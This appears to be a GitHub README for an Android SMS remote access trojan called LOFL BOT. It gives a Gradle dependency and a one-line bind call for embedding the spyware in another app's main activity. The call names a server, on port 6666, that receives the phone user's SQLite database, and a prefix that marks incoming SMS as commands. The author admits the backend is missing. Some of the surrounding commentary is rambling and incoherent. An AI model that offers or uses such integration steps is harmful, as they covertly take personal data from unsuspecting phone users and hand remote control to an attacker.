# LOFL BOT
### A 3-year-old injectable SMS RAT. No backend. Therefore, the spyware remote commands won't work. There is a self-destructible SMS notification messenger app. Like snapchat in your drawer. It's hidden in a git branch. I learned Android pentesting with library. I'm really embarrassed of the code. I removed this after a Nigerian NSA officer starred and followed me. This was my first RAT. Iwanteed to leave it to my child but it's for my father.

```gradle
implementation 'com.github.evilthreads669966:lofl:1.0'
```


 
 1. Put the following line of code in oncreate of your mainactivity class
 
 LoflActivity.bind(this,"10.0.2.2", "123", this.getClass().getName());
 
 the first parameter is the server address which is responsible for receiving a sqlite database file from the users phone.
 
 the second parameter is what you will put at the start of your sms commands to tell the app that 'this is a command'
 
 the third paremeter is to let lofl know what your launch activity is
 
 the database is sent over port 6666
